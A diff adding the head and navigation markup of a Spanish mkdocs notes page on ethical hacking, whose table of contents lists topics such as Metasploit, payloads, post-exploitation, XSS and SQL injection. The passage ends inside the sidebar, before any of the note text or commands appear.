@@ -1,0 +1,4512 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+        <link rel="canonical" href="http://docs.jorgepastorr.tk:50022/auditoria/apuntes_hacking/">
+      
+      
+        <meta name="author" content="Jorge Pastor">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
+    
+    
+      
+        <title>Haking ético - Apuntes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.adb8469c.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#7e57c2">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.86422ebf.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="deep-purple" data-md-color-accent="deep-purple">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#haking-etico" tabindex="0" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="http://docs.jorgepastorr.tk:50022" title="Apuntes" aria-label="Apuntes" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Apuntes
+            </span>
+            <span class="md-header-nav__topic">
+              
+                Haking ético
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" aria-label="search" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/jorgepastorr/apuntes/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    jorgepastorr/apuntes
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="http://docs.jorgepastorr.tk:50022" title="Apuntes" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Apuntes
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/jorgepastorr/apuntes/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    jorgepastorr/apuntes
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Apuntes Jorgepastorr" class="md-nav__link">
+      Apuntes Jorgepastorr
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Administracion
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Administracion
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/Configurar_pantallas_manualmente/" title="Configurar pantallas manualmente" class="md-nav__link">
+      Configurar pantallas manualmente
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/Debian_hostname_dinamico/" title="Debian hostname dinamico" class="md-nav__link">
+      Debian hostname dinamico
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/Mutt/" title="Que es mutt?" class="md-nav__link">
+      Que es mutt?
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/Procesos/" title="Procesos" class="md-nav__link">
+      Procesos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/Resetear_la_password_root/" title="Resetear la password root." class="md-nav__link">
+      Resetear la password root.
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/Vim/" title="Vim atajos básicos" class="md-nav__link">
+      Vim atajos básicos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/awk/" title="Uso básico de AWK" class="md-nav__link">
+      Uso básico de AWK
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/freeipa/" title="FreeIpa" class="md-nav__link">
+      FreeIpa
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/instalar_webmin/" title="instalar webmin" class="md-nav__link">
+      instalar webmin
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/per/" title="PER" class="md-nav__link">
+      PER
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/permisos_avanzados/" title="Permisos avanzados" class="md-nav__link">
+      Permisos avanzados
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/samba/" title="Samba" class="md-nav__link">
+      Samba
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/server-correo/" title="Servidor Correo" class="md-nav__link">
+      Servidor Correo
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/server-mensajeria/" title="Server mensajeria instantanea" class="md-nav__link">
+      Server mensajeria instantanea
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/ssh/" title="ssh" class="md-nav__link">
+      ssh
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/sudo/" title="sudo" class="md-nav__link">
+      sudo
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/umask/" title="umask" class="md-nav__link">
+      umask
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/usuarios/" title="Usuarios" class="md-nav__link">
+      Usuarios
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/vnc/" title="vnc" class="md-nav__link">
+      vnc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/webdav/" title="webdav" class="md-nav__link">
+      webdav
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-21" type="checkbox" id="nav-2-21">
+    
+    <label class="md-nav__link" for="nav-2-21">
+      Ldap
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-21">
+        Ldap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/ldap/Ldap-Samba-Hostpam/" title="Ldap - Samba - Hostpam" class="md-nav__link">
+      Ldap - Samba - Hostpam
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/ldap/acl_ejercicios/" title="Acl ejercicios" class="md-nav__link">
+      Acl ejercicios
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/ldap/host-kerberos-con-ldap/" title="Instalación host ldap-kerberos" class="md-nav__link">
+      Instalación host  ldap-kerberos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/ldap/ldap/" title="ldap" class="md-nav__link">
+      ldap
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-22" type="checkbox" id="nav-2-22">
+    
+    <label class="md-nav__link" for="nav-2-22">
+      Pxe
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-22">
+        Pxe
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/pxe/Servidor-pxe-con-rapberry/" title="Servidor pxe con rapberry" class="md-nav__link">
+      Servidor pxe con rapberry
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/pxe/guiapxe-fedora/" title="Guiapxe fedora" class="md-nav__link">
+      Guiapxe fedora
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-23" type="checkbox" id="nav-2-23">
+    
+    <label class="md-nav__link" for="nav-2-23">
+      Redes
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-23">
+        Redes
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/redes/apuntes-xarxa/" title="APUNTS DE XARXES" class="md-nav__link">
+      APUNTS DE XARXES
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/redes/comandos_router_switch/" title="Configuració de Routers" class="md-nav__link">
+      Configuració de Routers
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/redes/haproxy/" title="Haproxy" class="md-nav__link">
+      Haproxy
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../administracion/redes/redes2/" title="Redes2" class="md-nav__link">
+      Redes2
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      Auditoria
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Auditoria
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Haking ético
+      </label>
+    
+    <a href="./" title="Haking ético" class="md-nav__link md-nav__link--active">
+      Haking ético
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#nociones-basicas" class="md-nav__link">
+    Nociones básicas
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ambitos-de-la-seguridad" class="md-nav__link">
+    Ámbitos de la seguridad
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pruebas-acotadas-dentro-de-hacking-etico" class="md-nav__link">
+    Pruebas acotadas dentro de Hacking Ético
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-enfoques" class="md-nav__link">
+    Tipos de enfoques
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vectores-de-ataque" class="md-nav__link">
+    Vectores de ataque
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dispositivos-de-seguridad" class="md-nav__link">
+    Dispositivos de seguridad
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-de-pruebas" class="md-nav__link">
+    Laboratorio de pruebas
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduccion-kali" class="md-nav__link">
+    Introducción Kali
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#anonimato" class="md-nav__link">
+    Anonimato
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tunelizacion-de-protocolos" class="md-nav__link">
+    Tunelización de protocolos
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#servidores-proxy" class="md-nav__link">
+    Servidores proxy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#virtual-private-network-vpn" class="md-nav__link">
+    Virtual Private Network (VPN)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#redes-de-anonimacion" class="md-nav__link">
+    Redes de anonimación
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proxy" class="md-nav__link">
+    Proxy
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vpn" class="md-nav__link">
+    VPN
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cambiar-mac" class="md-nav__link">
+    Cambiar Mac
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creando-plataforma-anonima" class="md-nav__link">
+    Creando plataforma anónima
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#creando-tuneles" class="md-nav__link">
+    Creando túneles
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tunel-estatico" class="md-nav__link">
+    Túnel Estático
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tunel-dinamico" class="md-nav__link">
+    Túnel dinámico
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secuencia-de-tuneles" class="md-nav__link">
+    Secuencia de Túneles
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identificacion-y-explotacion-de-vulnerabilidades-en-sistemas" class="md-nav__link">
+    Identificación y explotación de vulnerabilidades en sistemas
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metodologia" class="md-nav__link">
+    Metodología
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtencion-de-datos" class="md-nav__link">
+    Obtención de datos
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recoleccion-de-datos" class="md-nav__link">
+    Recolección de datos
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-direcciones-ip" class="md-nav__link">
+    Análisis de direcciones ip
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#curiosidad" class="md-nav__link">
+    Curiosidad
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-sistemas-autonomos" class="md-nav__link">
+    Análisis de sistemas autónomos
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-dominios-y-subdominios" class="md-nav__link">
+    Análisis de dominios y subdominios
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#browser-hacking" class="md-nav__link">
+    Browser Hacking
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#herramienta-para-facilitar-el-analisis" class="md-nav__link">
+    Herramienta para facilitar el análisis
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#extraccion-metadatos" class="md-nav__link">
+    Extracción metadatos
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion" class="md-nav__link">
+    Enumeración
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis" class="md-nav__link">
+    Análisis
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#deteccion-vulnerabilidades" class="md-nav__link">
+    Detección vulnerabilidades
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipologia-de-exploits" class="md-nav__link">
+    Tipología de exploits
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-conexion" class="md-nav__link">
+    Tipos de conexión
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#conexion-directa" class="md-nav__link">
+    Conexión directa
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conexion-inversa" class="md-nav__link">
+    Conexión inversa
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit" class="md-nav__link">
+    Metasploit
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#workspaces" class="md-nav__link">
+    workspaces
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payloads" class="md-nav__link">
+    Payloads
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#explotar-vulnerabilidad" class="md-nav__link">
+    Explotar vulnerabilidad
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    Background
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#importar-datos-de-nmap" class="md-nav__link">
+    Importar datos de nmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#anadir-modulos" class="md-nav__link">
+    Añadir módulos
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generar-archivo-con-payload" class="md-nav__link">
+    Generar archivo con payload
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-explotacion" class="md-nav__link">
+    Post-explotación
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#extraer-informacion-del-sistema" class="md-nav__link">
+    Extraer información del sistema
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#elevar-privilegios" class="md-nav__link">
+    Elevar privilegios
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#eliminar-rastros-y-sistemas-de-seguridad" class="md-nav__link">
+    Eliminar rastros y sistemas de seguridad
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#espionaje" class="md-nav__link">
+    Espionaje
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#snifer" class="md-nav__link">
+    Snifer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backdoor" class="md-nav__link">
+    Backdoor
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivoting" class="md-nav__link">
+    Pivoting
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conectar-de-windows-a-windows" class="md-nav__link">
+    Conectar de windows a windows
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#de-shell-a-meterpreter" class="md-nav__link">
+    De shell a meterpreter
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraer-credenciales" class="md-nav__link">
+    Extraer credenciales
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ophcrack" class="md-nav__link">
+    Ophcrack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#procdump" class="md-nav__link">
+    Procdump
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unshadowjohn" class="md-nav__link">
+    unshadow/john
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuerza-bruta" class="md-nav__link">
+    Fuerza bruta
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evadir-antivirus" class="md-nav__link">
+    Evadir antivirus
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#veil-evasion" class="md-nav__link">
+    veil-evasion
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellter" class="md-nav__link">
+    shellter
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evadir-autenticacion" class="md-nav__link">
+    Evadir autenticación
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerabilidades-en-aplicaciones-web" class="md-nav__link">
+    vulnerabilidades en aplicaciones web
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metodologia_1" class="md-nav__link">
+    Metodología
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ataques-conocidos" class="md-nav__link">
+    Ataques conocidos
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#herramientas" class="md-nav__link">
+    Herramientas
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    xss
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#evasion-de-filtros" class="md-nav__link">
+    Evasión de filtros
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    sql injection
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    sqlmap
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerabilidades-en-red" class="md-nav__link">
+    vulnerabilidades en red
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-trafico" class="md-nav__link">
+    Análisis de trafico
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#intercepcion-de-trafico-man-in-the-midle" class="md-nav__link">
+    intercepción de trafico (man in the midle)
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dhcp-falso" class="md-nav__link">
+    dhcp falso
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerabilidades-wifi" class="md-nav__link">
+    vulnerabilidades wifi
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Bases datos
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Bases datos
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-1" type="checkbox" id="nav-4-1">
+    
+    <label class="md-nav__link" for="nav-4-1">
+      Mongo
+    </label>
